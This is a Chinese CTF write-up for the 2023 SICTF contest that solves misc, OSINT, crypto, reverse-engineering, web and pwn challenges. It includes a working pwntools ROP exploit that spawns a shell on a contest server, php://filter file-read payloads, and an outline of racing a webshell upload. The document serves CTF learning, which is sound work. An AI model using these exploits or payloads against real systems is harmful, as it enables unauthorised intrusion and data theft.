---
title: '2023 SICTF AND1=1 Writeup'
description: '长短波替换 . - 摩斯解码即可，也可使用在线网站上传音频解码'
pubDate: 2023-11-15
author: 'IHK-1'
tags: ['CTF', 'SICTF', '2023']
---

# MISC
## 签到 & 赛后问卷
略

## fast_morse

长短波替换 . - 摩斯解码即可，也可使用在线网站上传音频解码

[https://morsecode.world/international/decoder/audio-decoder-adaptive.html](https://morsecode.world/international/decoder/audio-decoder-adaptive.html)

## babyzip

bkcrack 明文爆破

```plain
bkcrack -C '/root/Desktop/flag.zip' -c flag.png -x 0 89504e470d0a1a0a0000000d49484452
```

得到 key  6424c164 7c334afd f99666e5 ，将压缩包重密码 123456 解压得到 flag.png

```plain
bkcrack -C '/root/Desktop/flag.zip' -c flag.png -k 6424c164 7c334afd f99666e5 -U '/root/Desktop/out.zip' 123456
```

文件尾部为 flag

## pixel_art

伪加密得到 图片

LSB 得到另一张图片

```python
from PIL import Image

im = Image.open('./00000000.png')
width,height = im.size
bin_out = ""
int_out = ""

for y in range(height):
    for x in range(width):
        r,g,b = im.getpixel((x,y))
        int_out += chr(r) + chr(g)  + chr(b)

print(int_out)
'''
..................!?!!.?..................?.?!.?....!.?.......!?!!.?!!!!!!?.?!.?!!!.!!!!!!!!!!!!!.?.........!?!!.?........?.?!.?..!.?.......!?!!.?!!!!!!?.?!.?!!!!!!!!!!!.?...............!?!!.?..............?.?!.?........!.?.................!?!!.?!!!!!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!!!!!!!!!...!.......!.!!!!!!!.?.............!?!!.?............?.?!.?........................!.....!.?.............!?!!.?!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!!!!!!!!!!!.....!.!!!!!!!!!!!!!!!!!.?...............!?!!.?..............?.?!.?..............!.!!!!!.?...............!?!!.?!!!!!!!!!!!!!!?.?!.?!!!.................!.?.......!?!!.?!!!!!!?.?!.?!!!!!!!...............!.?.............!?!!.?............?.?!.?......................!.....!.!.?...............!?!!.?!!!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!.?...............!?!!.?..............?.?!.?......!.?.............!?!!.?!!!!!!!!!!!!?.?!.?!!!!!!!!!.!!!!!!!!!!!!!!!!!!!.............!.!!!!!!!!!!!!!!!!!!!...........!.!.............!.!!!!!!!!!!!!!!!!!...........!.?...............!?!!.?..............?.?!.?!.!!!!!.!!!!!.......!.!!!.?.............!?!!.?!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!!!!!.!.?.................!?!!.?................?.?!.?............!.?.                        
'''
```

Ook 解码得到 flag

## QR_QR_QR
只需要将每次得到的二进制转成二维码解码后发送即可

```python
from PIL import Image
from pwn import *
from pyzbar.pyzbar import decode

conn = remote("210.44.151.51", 10473)

while True:
    count = 0
    qr_data = ""
    for i in range(115):
        data = conn.recvline().decode()
        qr_data += data
        print(data)
    print(qr_data)
    print(conn.recv().decode())

    im = Image.new("L", (115, 115)) # 二维码像素大小为固定的
    lines = qr_data.split("\n")

    for y in range(len(lines)):
        line = lines[y]
        for x in range(len(line)):
            bincode = line[x]
            if bincode == "1":
                im.putpixel((x, y), (255))
            else:
                im.putpixel((x, y), (0))

    content = decode(im)
    im.close()

    qr_content = b""
    for obj in content:
        qr_content += obj.data

    print("OK")
    conn.sendline(qr_content)

```

## 一起上号不

使用 cs-scripts-master 将 key RSA 密钥导出

同时 将 load 中的 cookie 导出

将其加入 CS_Decrypt 的 Beacon_metadata_RSA_Decrypt.py 中，运行得到 AES key 和 HMCA key

```plain
AES key:ef08974c0b06bd5127e04ceffe12597b
HMAC key:bd87fa356596a38ac3e3bb0b6c3496e9
```

将 submit 的 data 转为base64 并导入 Beacon_Task_return_AES_Decrypt ，解密 CS 流量得到 flag

## Easy_Shark

冰蝎流量 key 为 2295d22e2d70888f 

使用在线网站解密AES [http://tools.bugscaner.com/cryptoaes/](http://tools.bugscaner.com/cryptoaes/)

此步进行了 cat GronKey ，得到结果用同样方式得到 1,50,61,8,9,20,63,41

同样的方法 在 tcp.stream eq 3 发现 cat flag.txt 操作

回显以同样方式解码得到 TGLBOMSJNSRAJAZDEZXGHSJNZWHG

Gronsfeld 解码得到 flag

```python
from pycipher import Gronsfeld
print(Gronsfeld([1,50,61,8,9,20,63,41]).decipher("TGLBOMSJNSRAJAZDEZXGHSJNZWHG"))

# SICTFSHUMUISAGOODBOYYYYYYYYY
```

## 还不上号
flag2.pcapng 中包含 key.zip ，hint we1l 为密码解压缩包得到一个txt 

零宽隐写得到 \u200C\u200D\u200E\u202D\u202C\uFEFF\ key cd52f1488563bf0e ，对flag1.pcapng 进行冰蝎解密 解题方式如上题

tcp stream  eq 6 中有一个获取 base64 key 的命令

将回显解码后得到 key文件 

以上题的 一起上号不 的方法 使用key对flag2.pcapng 进行CS解码即可得到 flag2，具体过程参照上题

base32解码 tGNSC2OJTHA2S2NDDGA2TIMJVGQ4TSOJVPU=== 得到 3d-9385-4c0541549995}

flag1 部分继续参照上题 冰蝎解密

在tcp.stream eq 4 中 发现 flag1 部分，解密得到 SICTF{79e1755e-08a8-4d

# Forensics
## 购物之旅

BHS为北京华联，一层点不有个原麦山丘，在百度地图 两关键词搜索得到

SICTF{北京市_顺义区_新顺南大街_北京华联顺义金街购物中心}

## 天桥
[https://www.bilibili.com/video/BV12V4y1v7NX/](https://www.bilibili.com/video/BV12V4y1v7NX/)

SICTF{山西省西安市碑林区友谊西路}

## 美女姐姐
恰好CISCN华东南线下赛后逛闽江的时候到过这地方

 SICTF{福建省福州市仓山区烟台山公园}  

## 宝塔镇河妖

SICTF{山东省济宁市汶上县太子灵踪塔}

## 美丽月光
题目 flag 为 xx市xx区 ，为直辖市，树和大排档凳子说明是南方，街区风格也不像上海，直接猜成都的几个区即可得到位置

SICTF{成都市合川区_秋季}

# PWN
## [签到]shop
 一道很简单的签到题 

先有个输入提示，输入1，可以利用整数溢出，再输入-1，成功溢出 

## Different_gadget
分析题目，发现是一个64位的rop，但是没有rdi，就想着用 ，但是之前没怎么学，就想着用其他打法 

猜想将read参数传给write，就可以泄露了，write是固定的东西，但是read第二个参数是在栈上的buf，所以运行完read的时候，参数就保存了下来 这时候如果直接write_plt，因为第一个参数为0，所以不好用，这时候用main里面的write的第一个参数赋值，就能泄露了 

因为write恰好rdi在后面传的，要是在rsi之前就不好使 

这样就泄露出来了libc 

就可以任意泄露了，libc要什么有什么 

```python
from pwn import *
context(os='linux',arch='amd64',log_level='debug')
if args.REMOTE :
    io = remote('210.44.151.51',10430)
else:
    io = process('/home/k/桌面/attachment' )
elf = ELF('/home/k/桌面/attachment' )
libc = ELF('/home/k/桌面/libc.so.6' )

def duan():
    gdb.attach(io)
    pause()
#duan()

fake1 = elf.bss(0x200-0x8)

pay = flat(
    b'a'*(0x20),
    fake1,
    0x4011ce,
    elf.plt['write'],
    elf.sym['main']

)
io.send(pay)
libc_base = u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
libc_base = u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
libc_base = u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
libc_base = u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
libc_base = u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) - 0x1e40 - 0x28000

success(hex(libc_base))

leave_ret = 0x4011fd
rdi = libc_base+0x2a3e5
rsi = libc_base+0x000000000002be51
rdx_rbx = libc_base+0x0000000000090529
system = libc_base + libc.sym['system']
binsh = next(libc.search(b'/bin/sh')) + libc_base
ret = 0x40101a
syscall = libc_base+0x0000000000091396
rax = libc_base+0x0000000000045eb0

pay = flat(
    b'a'*0x20,
    elf.bss(0x500+0x600),  # rbp->0x404238->elf.bss()
    rdi,  # 0x404550          ,rsp = 0x4041b8
    binsh,
    rsi,
    0x0,
    rdx_rbx,
    0x0,
    0x0,
    rax,
    0x3b,
    syscall,

) 

io.send(pay)
io.interactive()
```

# WEB
## [签到]Include

  
payload:php://filter/read=convert.base64-encode/resource=flag.php  
  
payload:php://filter/read=convert.base64-encode/resource=/flag  

## Baby_PHP
根据php非法变量名的问题，在php版本低于8时点和空格将会转化为下划线  
这里用空格代替下划线，使用换行来绕过正则  
  
这里过滤要仔细看，注意括号的那里中间加了空格，过滤的就应该是中文下的括号，英文仍然可以用  
这里引号被过滤了所以使用无参rce  

## RCE
  
  

## 我全都要！
先审代码，找链子  
B::**destruct()=>A::**toString()=>B::game()=>P::**call=>B::**clone  
md5用数组绕过  
  
  

## 你能跟得上我的speed吗
随便传一个文件

一眼条件竞争

burp设置开始竞争

上传木马

设置高线程

开始循环上传

在开一个循环访问

同样设置线程和无paylaod，循环访问

成功写入shell，访问成功，并且执行了命令

然后直接换个读取flag的命令，再次循环访问就行

# Crypto
## [签到]古典大杂烩
直接在basecrack上面一把梭就行

```plain
SICTF{fe853b49-8730-462e-86f5-fc8e9789f077}
```

## Radio
已知三组nc，直接crt秒了，在网上随便找个板子都能打（但不知道我的sage为啥失败了）

```plain
import gmpy2
import binascii

def CRT(aList, mList):
    M = 1
    for i in mList:
        M = M * i  # 计算M = ∏ mi
    # print(M)
    x = 0
    for i in range(len(mList)):
        Mi = M // mList[i]  # 计算Mi
        Mi_inverse = gmpy2.invert(Mi, mList[i])  # 计算Mi的逆元
        x += aList[i] * Mi * Mi_inverse  # 构造x各项
    x = x % M
    return x

if __name__ == "__main__":

    n1 = 
    n2 = 
    n3 = 
    c1 = 
    c2 = 
    c3 = 
    cList = [c1,c2,c3]
    nList = [n1,n2,n3]
    m_e = CRT(cList, nList)  # 计算m^e
    e=17
    m, f = gmpy2.iroot(m_e, e)  # m_e开e次根
    m = hex(m)[2:]
    if len(m) % 2 == 1:
        m = m + '0'  # binascii.unhexlify()参数长度必须为偶数，因此做一下处理
    flag = binascii.unhexlify(m)
    print(flag)
# b'SICTF{fdc0afb5-1c81-46b9-a28a-241f5f64419d}'
```

## MingTianPao
many time pad，简单的分析，爆破写脚本，最后纠正就行，随便找一组进行异或，拿到明文

```plain
import binascii

import Crypto.Util.strxor as xo
import libnum, codecs, numpy as np

def isChr(x):
    if ord('a') <= x and x <= ord('z'): return True
    if ord('A') <= x and x <= ord('Z'): return True
    return False

def infer(index, pos):
    if msg[index, pos] != 0:
        return
    msg[index, pos] = ord(' ')
    for x in range(len(c)):
        if x != index:
            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ ord(' ')

dat = []

def getSpace():
    for index, x in enumerate(c):
        res = [xo.strxor(x, y) for y in c if x!=y]
        f = lambda pos: len(list(filter(isChr, [s[pos] for s in res])))
        cnt = [f(pos) for pos in range(len(x))]
        for pos in range(len(x)):
            dat.append((f(pos), index, pos))

c = [codecs.decode(x.strip().encode(), 'hex') for x in open('Problem.txt', 'r').readlines()]

msg = np.zeros([len(c), len(c[0])], dtype=int)

getSpace()

dat = sorted(dat)[::-1]
for w, index, pos in dat:
    infer(index, pos)

print('\n'.join([''.join([chr(c) for c in x]) for x in msg]))
def know(index, pos, ch):
    msg[index, pos] = ord(ch)
    for x in range(len(c)):
        if x != index:
            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ ord(ch)

know(0, 24, 'r')
know(1, 10, 'h')
know(1, 12, 'r')
know(2, 16, 't')
know(2, 28, 'd')

print('\n'.join([''.join([chr(c) for c in x]) for x in msg]))
z='1f2037202a1e6d06353b61263d050a0538493b3018544e14171d2b1c4218'
z=int(z,16)
from Crypto.Util.number import *
z=long_to_bytes(z)
y='Little Red Riding Hood promise'
y=y.encode()
print(xo.strxor(z,y))
# b'SICTF{MTP_AtTack_is_w0nderFu1}'
```

## Easy_CopperSmith
已知高位攻击罢了，套着脚本打，esplison调到0.02就行，不用调太小

```plain
n=114007680041157617250208809154392208683967639953423906669116998085115503737001019559692895227927818755160444076128820965038044269092587109196557720941716578025622244634385547194563001079609897387390680250570961313174656874665690193604984942452581886657386063927035039087208310041149977622001887997061312418381
p4=6833525680083767201563383553257365403889275861180069149272377788671845720921410137177
c=87627846271126693177889082381507430884663777705438987267317070845965070209704910716182088690758208915234427170455157948022843849997441546596567189456637997191173043345521331111329110083529853409188141263211030032553825858341099759209550785745319223409181813931086979471131074015406202979668575990074985441810

pbits= 512

kbits=pbits - p4.nbits()

p4 = p4 << kbits
PR.<x> = PolynomialRing(Zmod(n))
f = x+p4
roots = f.small_roots(X=2^kbits,beta=0.4,epsilon=0.02)

if roots:
    print(roots[0])
# 202391510046521224922090459343795854325714953873113323806407942893925
x=202391510046521224922090459343795854325714953873113323806407942893925
n=114007680041157617250208809154392208683967639953423906669116998085115503737001019559692895227927818755160444076128820965038044269092587109196557720941716578025622244634385547194563001079609897387390680250570961313174656874665690193604984942452581886657386063927035039087208310041149977622001887997061312418381
p=6833525680083767201563383553257365403889275861180069149272377788671845720921410137177
c=87627846271126693177889082381507430884663777705438987267317070845965070209704910716182088690758208915234427170455157948022843849997441546596567189456637997191173043345521331111329110083529853409188141263211030032553825858341099759209550785745319223409181813931086979471131074015406202979668575990074985441810
p=(p<<230)+x
from Crypto.Util.number import *
q=n//p
d=inverse(65537,(p-1)*(q-1))
m=pow(c,d,n)
print(long_to_bytes(m))
# SICTF{3f9366ed-b8e4-412f-bbd0-62616a24115c}'
```

## 签到题来咯！
刚看见的时候，想按线性来打，结果只能暴力的碰一下了，franklin reiter攻击。最后遍历一下，因为不知道e咯（如果有更好的方法，麻烦联系一下，谢啦）

```plain
n = 18993579800590288733556762316465854395650778003397512624355925069287661487515652428099677335464809283955351330659278915073219733930542167360381688856732762552737791137784222098296804826261681852699742456526979985201331982720936091963830799430264680941164508709453794113576607749669278887105809727027129736803614327631979056934906547015919204770702496676692691248702461766117271815398943842909579917102217310779431999448597899109808086655029624478062317317442297276087073653945439820988375066353157221370129064423613949039895822016206336117081475698987326594199181180346821431242733826487765566154350269651592993856883
c1 = 3089900890429368903963127778258893993015616003863275300568951378177309984878857933740319974151823410060583527905656182419531008417050246901514691111335764182779077027419410717272164998075313101695833565450587029584857433998627248705518025411896438130004108810308599666206694770859843696952378804678690327442746359836105117371144846629293505396610982407985241783168161504309420302314102538231774470927864959064261347913286659384383565379900391857812482728653358741387072374314243068833590379370244368317200796927931678203916569721211768082289529948017340699194622234734381555103898784827642197721866114583358940604520
c2 = 6062491672599671503583327431533992487890060173533816222838721749216161789662841049274959778509684968479022417053571624473283543736981267659104310293237792925201009775193492423025040929132360886500863823523629213703533794348606076463773478200331006341206053010168741302440409050344170767489936681627020501853981450212305108039373119567034948781143698613084550376070802084805644270376620484786155554275798939105737707005991882264123315436368611647275530607811665999620394422672764116158492214128572456571553281799359243174598812137554860109807481900330449364878168308833006964726761878461761560543284533578701661413931
e=2**9
from Crypto.Util.number import *
from gmpy2 import *
m=[]
while True:
    e=next_prime(e)
    R.<x> = PolynomialRing(Zmod(n))
    g1 = (114*x+2333)^e - c1
    g2 = (514*x+4555)^e - c2

    def myGcd(x, y):
        if y == 0:
            return x.monic()
        return myGcd(y, x%y)

    v = myGcd(g2, g1)
    M = n - v.coefficients()[0]

    
    print(M)
    print(e)
    m.append(M)
    if e>1024:
        print(m)
        break
m=[]
for i in m:
    i=long_to_bytes(i)
    if b'SICTF' in i:
        print(i)
# b'SICTF{hhh!!franklin_reiter_is_easy}'
```

## small_e
已知m的高位，copper

```plain
def phase2(high_m, n, c):
    R.<x> = PolynomialRing(Zmod(n), implementation='NTL')
    m = high_m + x
    M = m((m^3 - c).small_roots()[0])
    print(int(M))

n= 23407088262641313744603678186127228163189328033499381357614318160776774708961658114505773173784501557046914457908828086210961235530240151825359345210845219656000760996670856300710703016947799649686427460688236465568188205550456293373157997725204643414082796492333552579250010906010553831060540937802882205118399938918764313169385349293602085310111289583058965780887097301702677087443291977479125263301000328313103296364864396361278863921717374909215078711198899810620522933994481419395021233240234478331179727351050575360886334237633420906629984625441302945112631166021776379103081857393866576659121443879590011160797
e= 3
c= 1584727211980974717747362694412040878682966138197627512650829607105625096823456063149392973232737929737200028676411430124019573130595696272668927725536797627059576270068695792221537212669276826952363636924278717182163166234322320044764324434683614360641636360301452618063418349310497430566465329766916213742181
high_m=11658736990073967239197168945911788935424691658202162501032766529463315401599017877851823976178979438592

phase2(high_m, n, c)
m=11658736990073967239197168945911788935424691658202162501032766529463315401599017877852429209378407790461
from Crypto.Util.number import *
print(long_to_bytes(m))
# b'SICTF{2ca8e589-4a31-4909-80f0-9ecfc8f8cb37}'
```

## easy_math
爆破一下就好了，gcd求kp,这个题复杂度太高了（感觉出成docker更好了）

```plain
import itertools
from Crypto.Util.number import long_to_bytes
from tqdm import tqdm
from math import gcd

n = 68123067052840097285002963401518347625939222208495512245264898037784706226045178539672509359795737570458454279990340789711761542570505016930986418403583534761200927746744298082254959321108829717070206277856970403191060311901559017372393931121345743640657503994132925993800497309703877076541759570410784984067
hint1 = 564294243979930441832363430202216879765636227726919016842676871868826273613344463155168512928428069316237289920953421495330355385445649203238665802121198919543532254290185502622234014832349396422316629991217252686524462096711723580
hint2 = 484307144682854466149980416084532076579378210225500554261260145338511061452958092407101769145891750844383042274498826787696953308289632616886162073232218214504005935332891893378072083589751354946391146889055039887781077066257013110
c = 57751903193610662622957432730720223801836323458721550133101805763463060486486266309568004721657732742899781400754207249733137375171400440423755473421971160000575072519031824740691618617905549725344323721903857290320737224300672847773455169809689188843070599176261204013341324705808617411345132933937680951713
hints=[]
hints.append(hint1)
hints.append(hint2)

for a1, a2 in tqdm(list(itertools.product(range(2**12,2**13), repeat=2))):
    kq = gcd(a1 * hints[0] - a2 * hints[1], n)
    if 1 < kq < n:
        print(kq, a1, a2)
        break
for i in range(2**16, 1, -1):
    if kq % i == 0:
        kq //= i
q = kq
p = n // kq
d = pow(0x10001, -1, (p - 1) * (q - 1))
m = pow(c, d, n)
flag = long_to_bytes(m)
print(flag)
# b'SICTF{452aebb6-9c16-441a-ac42-fc608bf6063f}'
```

# RE
## [签到]PYC
直接在线工具解密即可  
SICTF{07e278e7-9d66-4d90-88fc-8bd61e490616}  

## chbase
使用DIE查看后发现是32位  
  
查看字串发现为base64换表。  
  
  
  
SICTF{base64_and_antidebugger}

## 不一样的base64
使用DIE查看发现为Pyinstaller封装  
利用工具进行解封装后发现111.pyc文件，利用pyc反编译工具后  
直接使用base64解拿到flag：SICTF{8e0d358d-8b9d-4866-9b02-6749b07ad09a}  

## Myobject
这是经典RC4，Key是SIFLAG  
  

## javacode
这是一个Java字节码的题目，是一个异或的线性变换，

```java
public static void main(String[] args){
    double[] numArray = {148.0d, 136.0d, 151.0d, 234.0d, 177.0d, 48.0d, 226.0d, 234.0d, 214.0d, 177.0d, 168.0d, 176.0d,
                         151.0d, 250.0d, 19.0d, 20.0d, 253.0d, 52.0d, 72.0d, 176.0d, 170.0d, 140.0d, 176.0d, 236.0d, 
                         54.0d, 231.0d, 212.0d, 237.0d, 135.0d, 151.0d, 150.0d, 135.0d, 217.0d, 231.0d, 229.0d, 32.0d, 
                         90.0d};
    double[] flagChars;

    Scanner scanner = new Scanner(System.in);
    System.out.println("请输入flag:");
    String flagInput = scanner.nextLine();
    char[] flagCharArray = flagInput.toCharArray();
    if(flagInput.length() != 38){
        System.out.println("flag length error");
        return;
    }
    flagChars = new double[flagCharArray.length-1];
    for(int i=0;i<flagCharArray.length-1;i++){
        int xorResult = flagCharArray[i] ^ flagCharArray[i+1];
        xorResult -= "SICTF2023".charAt(i % "SICTF2023".length());
        xorResult ^= "SICTF2023".charAt(i % "SICTF2023".length());
        xorResult &= 0xFF; 
        flagChars[i] = (double)xorResult;
    }
    if(Arrays.equals(flagChars,numArray)){
        System.out.println("OH!You are right!");
    }else{
        System.out.println("NO!You should try again!");
    }
    System.exit(0);
}
```

  
SICTF{OMG_j@vac0de_1s_sO_interesting!}

## Virus
这是一个易语言的压缩壳  
  
bp GetVersion  
这是解码之后的  
  
有弹窗要patch掉  
  
这是一个脱壳脚本

```java
/* 2019.4.4 
ESP保护壳 
易语言编译结果混淆.
Chinese program protection shell.
Unpack脚本V2.1 by 一叶 
PS:不足之处请指正
大佬巨佬勿喷
脚本小子绕道
*/
cmp $VERSION, "1.47"  //比较是否≥v1.47
jb exit1       //跳转到函数exit1
dbh            //隐藏OD
bc             //清除所有切换断点
bphwcall       //清除所有硬件断点
bpmc           //清除所有内存断点
var cc         //定义变量
find eip, #60# //查找代码puhshad  
mov cc,$RESULT //返回值赋给变量
bp cc          //变量下断
run            //运行
bc cc          //删除断点
sto            //单步
bphws esp,"r"  //esp下硬件访问断点
run            //运行  
bphwcall       //清除所有硬件断点
find eip,#E9??????FF# //查找jmp
mov cc,$RESULT //返回值赋给变量
cmp eip,cc     //比较当前是否就是Jmp，防止无效断点。
je equal       //是，跳转到equal函数
bp cc          //变量下断
run            //运行
bc cc          //删除断点
jmp equal      //跳转到equal函数

exit1:
msg "OD脚本插件版本过低！！请更换OD或插件！"  //信息框
ret            //返回

exit2:
dbs            //恢复隐藏OD
bc             //清除所有切换断点
bphwcall       //清除所有硬件断点
bpmc           //清除所有内存断点
msg "运行完毕！！" //信息框
ret            //返回

equal:
sto            //单步
cmt eip,"OEP"  //注释
an eip         //分析代码
msgyn "已来到OEP，是否立即dump到原目录？" //询问信息框
cmp $RESULT,1  //判断返回值
jne exit2      //否的话跳转到exit2
dpe "Dumped.exe",eip //立即dump 
jmp exit2      //跳转到exit2
ret            //返回
```

这是OD自带的易语言的花指令的去除插件  
  
这个题目的flag分为三个部分，第一部分来自一个智力题，第二部分是一个邮箱，第三部分是MBR逻辑锁  
  
套了个生成文件， 其中有函数会生成文件，因为写了空位置，导致看不到，此文件汇总有两块flag  
第一个是要抓行为记录，获取key，然后邮件分析获得flag  
  
第二个是一个小的数学游戏的算法分析

```python
from itertools import *
def f(x):
    a=0
    b=0
    for i in x:
        if i=='q':
            a=5
        if i=='s':
            b=3
        if i=='x':
            a=0
        if i=='p':
            b=0
        if i=='o':
            if a+b>=3:
                a+=b-3
                b=3
            else:
                b+=a
                a=0
        if i=='9':
            if a+b>=5:
                b+=a-5
                a=5
            else:
                a+=b
                b=0
    if a==4 or b==4:
        return 1
    else:
        return 0
for i in product('qsxpo9',repeat=6):
    if f(i):
        print(str(i).replace('\'','').replace(', ','')[1:][:-1])
```

  
第三部分flag=取文本左边 (到文本 (取数据摘要 (到字节集 (到文本 (到数值 (y) × 33 ＋ 9 ＋ 到数值 (y) － 22)))), 8)=“42962b5e”  
Flag:SICTF{647f033247de3a05f1879fb7b42962b5e}

